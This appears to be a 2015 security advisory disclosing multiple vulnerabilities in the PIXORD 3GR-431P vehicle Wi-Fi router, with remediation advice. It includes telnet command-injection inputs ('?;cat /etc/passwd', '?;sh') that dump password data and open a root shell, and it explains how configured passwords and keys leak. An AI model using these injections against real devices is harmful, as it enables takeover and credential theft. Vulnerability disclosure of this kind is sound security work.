@@ -1,0 +1,231 @@
+# Exploit Title: [Vehicle 3G Wi-Fi Router - PIXORD - Multiple
+Vulnerabilities]
+# Date: May 01, 2015 [No response from Vendor till date]
+# Discovered by: Karn Ganeshen
+# Vendor Homepage: [http://www.pixord.com/en/products_show.php?show=17]
+# Version: [Model Name :3GR-431P]
+[Software Version :RTA-A001_02]
+[Wireless Driver Version :2.6.0.0]
+
+*Vehicle 3G Wi-Fi Router - PIXORD *
+http://www.pixord.com/en/products_show.php?show=17
+
+*Device Info *
+
+Model Name :3GR-431P
+Software Version :RTA-A001_02
+Wireless Driver Version :2.6.0.0
+
+PiXORD 3GR-431P 3G Wi-Fi Router is a 3G + GPS + 802.11n (2T2R) wireless
+router. It supports Internet access via 3G and receives position
+information from GPS. 3GR-431P also supports two Ethernet ports for LAN
+connectivity and 802.11n Wi-Fi Access Point for WLAN connectivity.
+
+It is available to install the 3GR-431P on the transportation. The
+passengers can use the laptop or smart phone via Wi-Fi to browse the
+Internet on the go. The Ethernet port also can connect IP camera to provide
+the real time monitoring.
+
+Vulnerability Impact: Easy and full device compromise. Access to configured
+keys, passwords, pass-phrases, accounts, etc. Ability to monitor the user /
+vehicle via camera / connected devices.
+
+*Multiple Security Vulnerabilities *
+
+*1. OS command injection *
+$ telnet 192.168.1.10
+Trying 192.168.1.10...
+Connected to 192.168.1.10.
+Escape character is '^]'.
+Vehicle 3G Wi-Fi Router
+Login: admin
+Password:
+>
+> ?
+mobile3G
+mobileGPS
+model
+reboot
+restoredefault
+version
+
+As seen above, only few specific, functional options are available for
+device management.
+
+However, we can bypass this and dump hashes easily.
+
+> ?;cat /etc/passwd
+sh: ?: not found
+
+admin:<password1>:0:0:Adminstrator:/:/bin/sh
+support:<password2>:0:0:Adminstrator:/:/bin/sh
+user:<password3>:0:0:Adminstrator:/:/bin/sh
+
+> exit
+
+Note that this is also applicable when a non-admin ‘user’ / ‘support’ logs
+in over the Telnet.
+
+The web application lacks strict input validation and hence vulnerable to
+OS command injection attack.
+
+*2. Configuration not secured properly / AuthZ issues *
+
+The device has three users - admin, support, user.
+
+Apparently, there is no separation of privileges between these 3 users,
+when accessing over HTTP(S). All options are available to all three then.
+This allows 'user' /'support' to access device configuration file -
+RT2880_Settings.dat. Configuration backup contains b64-encoded login
+passwords + clear-text WPA keys + other sensitive information.
+
+.. …
+*Sensitive information in configuration file - *
+
+*more RT2880_Settings.dat *
+#The following line must not be removed.
+Default
+WebInit=1
+HostName=pixord
+Login=admin
+Password=<admin_password_here>=
+Login2=support
+Password2=<support_password_here>==
+Login3=user
+Password3=<user_password_here>==
+OperationMode=1
+Platform=RT3352
+.....
+<snip>
+.....
+wan_pppoe_user=pppoe_user
+wan_pppoe_pass=pppoe_passwd
+wan_l2tp_server=l2tp_server
+wan_l2tp_user=l2tp_user
+wan_l2tp_pass=l2tp_passwd
+.....
+<snip>
+.....
+wan_pptp_server=pptp_server
+wan_pptp_user=pptp_user
+wan_pptp_pass=pptp_passwd
+.....
+<snip>
+.....
+DDNS=
+DDNSAccount=<ddns_account_name_here>
+DDNSPassword=<ddns_password_here>
+CountryRegion=
+CountryRegionABand=
+CountryCode=
+BssidNum=1
+SSID1=PiXORD
+WirelessMode=9
+.....
+<snip>
+.....
+WscSSID=RalinkInitialAP
+WscKeyMGMT=WPA-EAP
+WscConfigMethod=138
+WscAuthType=1
+WscEncrypType=1
+WscNewKey=<wsc_key_here>
+IEEE8021X=0
+IEEE80211H=0
+CSPeriod=6
+PreAuth=0
+AuthMode=WPAPSKWPA2PSK
+EncrypType=TKIPAES
+RekeyInterval=3600
+RekeyMethod=TIME
+PMKCachePeriod=10
+WPAPSK1=<WPA_PSK_Key_here>
+DefaultKeyID=2
+Key1Type=0
+Key1Str1=
+Key2Type=0
+Key2Str1=
+Key3Type=0
+Key3Str1=
+Key4Type=0
+Key4Str1=
+WapiPskType=0
+.....
+<snip>
+.....
+WdsEnable=0
+WdsEncrypType=NONE
+WdsList=
+WdsKey=
+WirelessEvent=0
+RADIUS_Server=0
+RADIUS_Port=1812
+RADIUS_Key=
+RADIUS_Acct_Server=
+RADIUS_Acct_Port=1813
+RADIUS_Acct_Key=
+.....
+<snip>
+.....
+wan_3g_apn=public
+wan_3g_dial=*99#
+wan_3g_user=
+wan_3g_pass=
+<snip>
+RADIUS_Key1=<radius_key_here>
+.....
+<snip>
+.....
+
+Also, as observed in point 1 above, all the users have a UID 0, i.e. root
+level privileges to the device:
+
+admin:<password1>:0:0:Adminstrator:/:/bin/sh
+support:<password2>:0:0:Adminstrator:/:/bin/sh
+user:<password3>:0:0:Adminstrator:/:/bin/sh
+
+The application should ideally provide specific privileges to different
+users, and enforce strict access control.
+
+*3. Application does not secure configured passwords (HTTPS) *
+
+Masked password(s) can be retrieved via frame source (inspect element) and
+/ or intercepting request via a proxy.
+
+The application should mask/censure (*****) the passwords, keys and any
+other crucial pieces of configuration and must not pass the values in
+clear-text.
+
+*4. Program / Scripts running in an insecure manner - leaking clear-text
+passwords in process information *
+
+After logging in to the device over Telnet, we can drop in to a shell via
+OS command injection attack described in point 1.
+
+> ?;sh
+sh: ?: not found
+Enter 'help' for a list of built-in commands.
+BusyBox v1.12.1 (2012-12-25 11:48:22 CST) built-in shell (ash)
+
+#
+
+Checking running processes reveal a system program *inadyn*, which
+apparently is a service for ddns connectivity, leaking valid username and
+password in clear-text.
+
+# ps aux
+PID USER VSZ STAT COMMAND
+1 admin 1768 S init
+2 admin 0 RWN [ksoftirqd/0]
+.....
+<snip>
+.....
+2159 admin 1096 S inadyn -u *<ddns-username_here>* -p *<ddns-password_here>*
+ -a *<ddns_domain_here>*
+4050 admin 1768 R ps aux
+
+The programs should be run securely without passing cli arguments and
+parameter values in clear-text.
+-- 
+Best Regards,
+Karn Ganeshen
